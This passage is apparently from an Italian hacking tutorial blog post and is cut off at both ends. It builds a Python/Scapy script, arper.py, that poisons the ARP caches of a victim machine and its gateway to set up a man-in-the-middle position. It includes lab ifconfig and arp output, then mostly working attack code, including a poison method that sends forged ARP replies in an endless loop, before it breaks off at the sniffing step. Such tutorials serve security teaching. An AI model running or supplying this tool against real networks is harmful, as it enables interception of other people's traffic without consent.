        ether b4:6b:fc:a3:63:99  txqueuelen &lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ethernet&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
        RX packets &lt;span style=&#34;color:#ae81ff&#34;&gt;190150&lt;/span&gt;  bytes &lt;span style=&#34;color:#ae81ff&#34;&gt;230866258&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;230.8 MB&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
        RX errors &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  dropped &lt;span style=&#34;color:#ae81ff&#34;&gt;2237&lt;/span&gt;  overruns &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  frame &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
        TX packets &lt;span style=&#34;color:#ae81ff&#34;&gt;52365&lt;/span&gt;  bytes &lt;span style=&#34;color:#ae81ff&#34;&gt;14313727&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;14.3 MB&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
        TX errors &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  dropped &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; overruns &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  carrier &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  collisions &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Il comando ifconfig ci mostra la configurazione della rete per un’interfaccia specifica (in quest’esempio è la wlp61s0) o per tutte le interfacce se non ne richiediamo una in particolare.&lt;/p&gt;
&lt;p&gt;L’output mostra che l’indirizzo &lt;strong&gt;inet&lt;/strong&gt; (IPv4) per il dispositivo è 192.168.1.22. È mostrato anche l’indirizzo mac ether che è b4:6b:fc:a3:63:99.&lt;/p&gt;
&lt;p&gt;Ora vediamo la cache ARP della macchina vittima, usiamo il comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;arp -a
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Il risultato è qualcosa del tipo:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;wind3.hub &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;192.168.1.1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; associato a b8:d5:26:69:b5:dc &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;ether&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; su wlp61s0
Kobra3390.wind3.hub &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;192.168.1.233&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; associato a 18:cc:18:fa:ad:b1 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;ether&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; su wlp61s0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;192.168.1.233 è l’indirizzo IP della macchina Kali, mentre 192.168.1.1 è l’indirizzo IP del gateway. Oltre ai loro indirizzi IP possiamo vedere i loro indirizzi MAC. Prendiamo nota di questi valori in quanto, visualizzando la cache ARP ad attacco iniziato, potremo verificare di aver provocato il cambio dell’indirizzo MAC registrato per il gateway.&lt;/p&gt;
&lt;p&gt;Conoscendo l’indirizzo IP dell’attaccante e del gateway possiamo spostarci sulla macchina attaccante e preparare lo script Python, chiameremo lo script arper.py:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; multiprocessing &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Process
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; scapy.all &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; (ARP, Ether, conf, get_if_hwaddr, 
                        send, sniff, sndrcv, srp, wrpcap)

&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; sys&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; time

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;get_mac&lt;/span&gt;(targetip):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Arper&lt;/span&gt;:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self, victim, gateway, interface&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;eth0&amp;#39;&lt;/span&gt;):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;(self):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;poison&lt;/span&gt;(self):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sniff&lt;/span&gt;(self, count&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;restore&lt;/span&gt;(self):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
    (victim, gateway, interface) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;], sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;])
    myarp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Arper(victim, gateway, interface)
    myarp&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;run()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Come si vede, definiamo una funzione helper per ottenere l’ indirizzo MAC per una determinata macchina e una classe &lt;strong&gt;Arper&lt;/strong&gt; per fare poisoning (metodo poison), sniffare (metodo sniff) e ripristinare (metodo restore) la configurazione di rete. Completiamo ogni sezione iniziando con la funzione &lt;strong&gt;get_mac&lt;/strong&gt; che restituisce un indirizzo MAC per uno specifico indirizzo IP. Ci servono gli indirizzi MAC della vittima e del gateway:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;get_mac&lt;/span&gt;(targetip):
    packet &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Ether(dst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ff:ff:ff:ff:ff:ff&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;ARP(op&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;who-has&amp;#34;&lt;/span&gt;, pdst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;targetip)
    resp, _ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; srp(packet, timeout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, retry&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, verbose&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _, r &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; resp:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; r[Ether]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;src
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Le passiamo l’indirizzo IP dell’obiettivo e creiamo un pacchetto. La funzione &lt;strong&gt;Ether&lt;/strong&gt; specifica che il pacchetto è concepito per essere un broadcast e la funzione ARP che la richiesta punta a sapere l’indirizzo MAC collegato chiedendo a ogni nodo della rete se è in possesso di quell’indirizzo IP. Inviamo poi il pacchetto con la funzione di Scapy &lt;strong&gt;srp&lt;/strong&gt; che si occupa di inviare e ricevere pacchetti a livello 2 della rete. Riceviamo la risposta nella variabile &lt;strong&gt;resp&lt;/strong&gt; che dovrebbe contenere la sorgente &lt;strong&gt;Ether&lt;/strong&gt; (il MAC address) del corrispondente indirizzo IP. Subito dopo, iniziamo a scrivere la classe &lt;strong&gt;Arper&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Arper&lt;/span&gt;:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self, victim, gateway, interface&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;eth0&amp;#39;&lt;/span&gt;):
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victim &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; victim
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victimmac &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; get_mac(victim)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gateway &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; gateway
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gatewaymac &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; get_mac(gateway)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interface &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; interface
        conf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;iface &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; interface
        conf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;verb &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Initialized &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;interface&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Gateway (&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;gateway&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;) is at &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gatewaymac&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;.&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Victim (&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;victim&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;) is at &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victimmac&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;.&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Inizializziamo la classe con gli indirizzi IP del gateway e della vittima e specifichiamo l’interfaccia che vogliamo utilizzare (&lt;em&gt;eth0&lt;/em&gt; è l’opzione di default). Popoliamo le variabili interne dell’oggetto con &lt;strong&gt;interface&lt;/strong&gt;, &lt;strong&gt;victim&lt;/strong&gt;, &lt;strong&gt;victimmac&lt;/strong&gt;, &lt;strong&gt;gateway&lt;/strong&gt; e &lt;strong&gt;gatewaymac&lt;/strong&gt; stampandone i valori a console.&lt;/p&gt;
&lt;p&gt;All’interno della classe &lt;strong&gt;Arper&lt;/strong&gt; scriviamo la funzione run che rappresenta l’entry point del nostro attacco:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;(self):
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;poison_thread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Process(target&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;poison)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;poison_thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;start()

        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sniff_thread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Process(target&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sniff)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Il metodo &lt;strong&gt;run&lt;/strong&gt; esegue tutto il lavoro principale dell’oggetto &lt;strong&gt;Arper&lt;/strong&gt;. Imposta ed esegue due processi:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Il primo avvelena la cache ARP&lt;/li&gt;
&lt;li&gt;Il secondo ci permette di osservare l’evoluzione dell’attacco sniffando il traffico di rete&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Il metodo &lt;strong&gt;poison&lt;/strong&gt; produce i pacchetti “avvelenati” e li invia alla vittima e al gateway:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;poison&lt;/span&gt;(self):
        poison_victim &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ARP()
        poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;op &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
        poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;psrc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gateway
        poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pdst &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victim
        poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwdst &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victimmac
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ip src: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;psrc&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ip dst: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pdst&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mac dst: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwdst&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mac src: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwsrc&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        print(poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;summary())
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;)
        poison_gateway &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ARP()
        poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;op &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
        poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;psrc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victim
        poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pdst &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gateway
        poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwdst &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gatewaymac
        
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ip src: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;psrc&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ip dst: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pdst&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mac dst: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwdst&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mac src: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwsrc&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        print(poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;summary())
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Beginning the ARP poison. [CTRL-C to stop]&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
            sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stdout&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;)
            sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stdout&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;flush()
            &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
                send(poison_victim)
                send(poison_gateway)
            &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;KeyboardInterrupt&lt;/span&gt;:
                self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;restore()
                sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit()
            &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
                time&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Il metodo &lt;strong&gt;poison&lt;/strong&gt; imposta i dati che useremo per “avvelenare” la vittima e il gateway. Per prima cosa, creiamo un pacchetto ARP &lt;em&gt;poisoned&lt;/em&gt; per la vittima. Allo stesso modo, ne prepariamo uno per il gateway. Inganniamo il gateway inviandogli l’indirizzo IP della vittima ma con il MAC dell’aggressore. Facciamo poi lo stesso inviando alla vittima l’indirizzo IP del gateway ma con il MAC address dell’aggressore. Stampando tutti i dettagli di queste operazioni a console potremo essere certi di aver fissato correttamente indirizzi destinazione e payload.&lt;/p&gt;
&lt;p&gt;Poi iniziamo a spedire i pacchetti “avvelenati” alle destinazioni in un ciclo infinito per assicurarci che le rispettive voci nelle cache ARP rimangano corrotte per tutta la durata dell’attacco.&lt;/p&gt;
&lt;p&gt;Porremo fine al ciclo solo quando immetteremo la combinazione da tastiera CTRL-C (KeyboardInterrupt) e da lì ripristineremo la situazione riportandola alla normalità, inviando informazioni corrette sia alla vittima sia al gateway e cancellando gli effetti del nostro attacco.&lt;/p&gt;
&lt;p&gt;Per vedere e registrare cosa succede durante le nostre operazioni di &lt;em&gt;poisoning&lt;/em&gt;, intercettiamo il traffico di rete con il metodo &lt;strong&gt;sniff&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sniff&lt;/span&gt;(self, count&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;):
        time&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Sniffing &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;count&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; packets&amp;#39;&lt;/span&gt;)
